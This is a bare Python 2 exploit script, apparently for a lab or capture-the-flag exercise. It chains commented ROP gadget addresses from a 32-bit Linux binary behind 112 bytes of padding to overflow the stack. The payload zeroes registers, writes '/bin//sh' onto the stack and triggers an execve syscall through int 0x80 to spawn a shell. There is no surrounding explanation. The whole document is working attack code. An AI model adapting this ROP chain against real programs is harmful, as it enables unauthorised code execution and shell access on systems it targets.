from struct import pack 

#0x08055e36  pop %eax
#0x08055e37  cmp $0xfffff001,%eax
#0x08055e3c  jae 
#0x08055e42  ret  

#0x080481ec  pop %ebx  
#0x080481ed  ret 

#0x80643e8  xor %edx,%edx
#0x80643ea  div %ebx
#0x80643ec  add %eax,%ecx
#0x80643ee  mov %ecx,%eax
#0x80643f0  pop %ebx 
#0x80643f1  pop %esi 
#0x80643f2  ret 

# clear edx

#0x08055ea6:  pop    %eax
#0x08055ea7:  cmp    $0xfffff001,%eax
#0x08055eac:  jae    8058680 <__syscall_error>
#0x08055eb2:  ret 

#0x80489ff  movb $0x0 ($eax)
#0x8048a02  pop  %esi
#0x8048a03  pop  %edi
#0x8048a04  pop  %ebp
#0x8048a05  ret    

#0x804cf26  xor %eax,%eax
#0x804cf28  pop %ebx
#0x804cf29  ret

#0x807c782  add $0xb,%eax
#0x807c785  pop %edi 
#0x807c786  ret 

#0x8057361  pop %ecx
#0x8057362  pop %ebx 
#0x8057363  ret
 
#0x8057ae0  int  0x80
#           ret 


bin_addr_after = 0xbffe9a58 
ebp = 0xbffe99f8
bin_addr = 0xbffe9a50
ecx_val = 0xbffe9a5c
bin_hex = 0x6e69622f 
sh_hex = 0x68732f2f


print "\x90" * 112 + pack("<I",0x08055e36) + '\x31'*4 + pack("<I",0x080481ec) + '\x31'*4 + pack("<I",0x080643e8) + "\x90" * 8 + pack("<I",0x08055ea6) + pack ("<I", bin_addr_after)  + pack("<I",0x080489ff) + '\x31'*8 + pack("<I",ebp) + pack("<I",0x0804cf26) + '\x31'*4 + pack("<I",0x0807c782) + '\x31'*4 + pack("<I",0x08057361)  + pack("<I",ecx_val) + pack("<I",bin_addr) + pack("<I",0x08057ae0)+ pack("<I",bin_hex) + pack("<I",sh_hex) + '\x90'*4 + pack("<I",bin_addr)
        




